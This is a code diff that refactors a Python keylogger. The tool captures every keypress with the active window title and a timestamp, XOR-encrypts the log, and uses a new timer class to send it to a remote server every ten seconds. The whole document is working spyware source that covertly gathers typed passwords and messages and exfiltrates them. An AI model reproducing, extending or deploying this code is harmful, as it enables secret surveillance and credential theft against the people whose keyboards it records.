@@ -3,15 +3,12 @@ import keyboard
 import pygetwindow as gw
 import binascii
 import requests
-import json
 import time
 from threading import Thread
 
 
 class KeyLoggerService:
-    def __init__(self, server_sender, cipher):
-        self.server_sender = server_sender
-        self.cipher = cipher
+    def __init__(self):
         self.data_to_send = {}
 
     def on_press(self, event):
@@ -19,7 +16,6 @@ class KeyLoggerService:
         window = window.title if window else "Unknown Window"
         timestamp = datetime.now().strftime("%d/%m/%y %H:%M")
         key = self._format_key(event.name)
-        encrypted_key = self.cipher.encrypt(key)
 
         if window not in self.data_to_send:
             self.data_to_send[window] = {}
@@ -27,15 +23,7 @@ class KeyLoggerService:
         if timestamp not in self.data_to_send[window]:
             self.data_to_send[window][timestamp] = ""
 
-        self.data_to_send[window][timestamp] += encrypted_key
-
-    def start_sending_data(self):
-        while True:
-            if self.data_to_send:
-                self.server_sender.send_data(self.data_to_send)
-                print("Data sent to server.")
-                self.data_to_send = {}
-            time.sleep(10)
+        self.data_to_send[window][timestamp] += key
 
     def _format_key(self, key_name):
         if key_name == "enter":
@@ -54,12 +42,32 @@ class XorCipher:
     def encrypt(self, text):
         return binascii.hexlify(self._xor_process(text).encode()).decode()
 
-    def decrypt(self, text):
-        return self._xor_process(binascii.unhexlify(text).decode())
-
     def _xor_process(self, text):
         key_cycle = (self.key * ((len(text) // len(self.key)) + 1))[:len(text)]
         return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key_cycle))
+
+
+class SendingTimer:
+    def __init__(self, server_sender, cipher, key_logger, time_to_send=10):
+        self.server_sender = server_sender
+        self.cipher = cipher
+        self.key_logger = key_logger
+        self.time_to_send = time_to_send
+
+    def start_sending_data(self):
+        while True:
+            if self.key_logger.data_to_send:
+                encrypted_data = self._encrypt_data(self.key_logger.data_to_send)
+                self.server_sender.send_data(encrypted_data)
+                print("Data sent to server.")
+                self.key_logger.data_to_send = {}
+            time.sleep(self.time_to_send)
+
+    def _encrypt_data(self, data):
+        encrypted_data = {}
+        for window, timestamps in data.items():
+            encrypted_data[window] = {timestamp: self.cipher.encrypt(text) for timestamp, text in timestamps.items()}
+        return encrypted_data
 
 
 class ServerSender:
@@ -98,11 +106,12 @@ class ServerSender:
 if __name__ == "__main__":
     server_sender = ServerSender()
     xor_cipher = XorCipher()
-    key_logger = KeyLoggerService(server_sender, xor_cipher)
+    key_logger = KeyLoggerService()
+    sending_timer = SendingTimer(server_sender, xor_cipher, key_logger)
 
     keyboard.on_press(key_logger.on_press)
 
-    send_thread = Thread(target=key_logger.start_sending_data)
+    send_thread = Thread(target=sending_timer.start_sending_data)
     send_thread.daemon = True
     send_thread.start()
     keyboard.wait()
